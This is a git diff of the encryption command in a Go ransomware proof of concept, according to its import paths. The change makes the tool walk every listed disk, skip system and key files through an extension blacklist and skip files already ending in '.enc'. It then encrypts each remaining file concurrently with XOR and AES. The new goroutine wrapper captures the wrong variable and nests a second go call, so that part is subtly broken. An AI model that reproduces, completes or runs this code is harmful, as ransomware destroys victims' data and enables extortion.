@@ -1,14 +1,15 @@
 package cmd
 
 import (
-	"davidlares/ransomware/aes"
-	"davidlares/ransomware/encrypt"
-	"davidlares/ransomware/layout"
-	"davidlares/ransomware/logs"
-	"davidlares/ransomware/mapper"
-	"davidlares/ransomware/rsa"
-	"davidlares/ransomware/sandbox"
+	"davidlares/golang-ransomware-poc/aes"
+	"davidlares/golang-ransomware-poc/encrypt"
+	"davidlares/golang-ransomware-poc/layout"
+	"davidlares/golang-ransomware-poc/logs"
+	"davidlares/golang-ransomware-poc/mapper"
+	"davidlares/golang-ransomware-poc/rsa"
+	"davidlares/golang-ransomware-poc/sandbox"
 	"fmt"
+	"strings"
 
 	"github.com/spf13/cobra"
 )
@@ -28,16 +29,25 @@ var encryptCmd = &cobra.Command{
 		// encrypt control
 		encryptControl := make(chan struct{}, 10)
 		// disk
-		disk := mapper.ListingDisks()
+		disks := mapper.ListingDisks()
+		// black list implementation
+		blackList := []string{".msi", ".exe", ".dll", ".sys", ".ini", ".go", ".pem", ".txt"}
 		// looping disks
-		for _, disk := range disk {
-			files := mapper.MapFiles(disk, []string{".efi", ".pdf"})
+		for _, disk := range disks {
+			files := mapper.MapFiles(disk, blackList)
 			for _, file := range files {
+				// evaluating suffix and skipping
+				if strings.HasSuffix(file, ".enc") {
+					continue
+				}
 				// adding to waitgroup
 				mapper.Wg.Add(1)
 				// encrypt control
 				encryptControl <- struct{}{}
-				go encrypt.EncryptWithXorAndAES(file, "aes_key.txt", encryptControl)
+				// calling the function (anon)
+				go func(f string) {
+					go encrypt.EncryptWithXorAndAES(file, "aes_key.txt", encryptControl)
+				}(file)
 			}
 		}
 		// then
